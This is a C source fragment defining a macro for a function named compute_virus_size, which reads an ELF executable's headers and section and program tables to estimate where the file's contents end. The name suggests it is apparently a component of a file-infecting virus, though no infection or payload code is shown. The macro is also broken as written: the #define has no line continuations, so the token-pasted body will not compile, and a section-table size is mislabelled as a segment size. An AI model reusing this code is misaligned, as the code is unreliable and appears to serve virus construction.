#define DEFINE_COMPUTE_VIRUS_SIZE(N)

static off_t compute_virus_size_##N(FILE *file) {
    int fd = fileno(file);
    assert(fd != -1);

    off_t estimate = 0;

    Elf##N##_Ehdr header;
    if (fread(&header, sizeof(header), 1, file) == 0) {
        assert(ferror(file));
        return -errno;
    }
    assert(header.e_type == ET_EXEC);
    assert(header.e_phentsize == sizeof(Elf##N##_Phdr));
    assert(header.e_shentsize == sizeof(Elf##N##_Shdr));

    estimate = header.e_ehsize;

    off_t num_segments = 0;
    off_t num_sections = 0;
    if (header.e_shoff > 0) {
        int result = fseeko(file, header.e_shoff, SEEK_SET);
        assert(!result);

        Elf##N##_Shdr section_header;
        if (fread(&section_header, sizeof(section_header), 1, file) == 0) {
            assert(ferror(file));
            return -errno;
        }
        num_segments = section_header.sh_info;
        num_sections = section_header.sh_size;
    }

    if (header.e_phnum < PN_XNUM) {
        num_segments = header.e_phnum;
    }
    if (header.e_shnum < SHN_LORESERVE) {
        num_sections = header.e_shnum;
    }

    off_t segment_header_table_size = num_sections * sizeof(Elf##N##_Shdr);
    off_t segment_header_table_end = header.e_shoff + segment_header_table_size;
    if (estimate < segment_header_table_end) {
        estimate = segment_header_table_end;
    }

    off_t program_header_table_size = num_segments * sizeof(Elf##N##_Phdr);
    off_t program_header_table_end = header.e_phoff + program_header_table_size;
    if (estimate < program_header_table_end) {
        estimate = program_header_table_end;
    }

    if (num_sections > 1) {
        off_t offset = header.e_shoff + sizeof(Elf##N##_Shdr);
        int result = fseeko(file, offset, SEEK_SET);
        assert(!result);
        posix_fadvise(fd, offset, segment_header_table_size - sizeof(Elf##N##_Shdr),
                      POSIX_FADV_SEQUENTIAL);
        for (off_t i = 1; i < num_sections; ++i) {
            Elf##N##_Shdr section_header;
            if (fread(&section_header, sizeof(section_header), 1, file) == 0) {
                assert(ferror(file));
                return -errno;
            }
            switch (section_header.sh_type) {
                case SHT_NULL:
                case SHT_NOBITS:
                    break;
                default: {
                    off_t section_end = section_header.sh_offset + (off_t) section_header.sh_size;
                    if (estimate < section_end) {
                        estimate = section_end;
                    }
                    break;
                }
            }
        }
    }

    if (num_segments > 0) {
        int result = fseeko(file, header.e_phoff, SEEK_SET);
        assert(!result);
        posix_fadvise(fd, header.e_phoff, program_header_table_size,
                      POSIX_FADV_SEQUENTIAL);
        for (off_t i = 0; i < num_segments; ++i) {
            Elf##N##_Phdr program_header;
            if (fread(&program_header, sizeof(program_header), 1, file) == 0) {
                assert(ferror(file));
                return -errno;
            }
            switch (program_header.p_type) {
                case PT_NULL:
                /* already included in file; only specified if also in memory */
                case PT_PHDR:
                    break;
                default: {
                    off_t segment_end = program_header.p_offset + (off_t) program_header.p_filesz;
                    if (estimate < segment_end) {
                        estimate = segment_end;
                    }
                    break;
                }
            }
        }
    }

    return estimate;
}
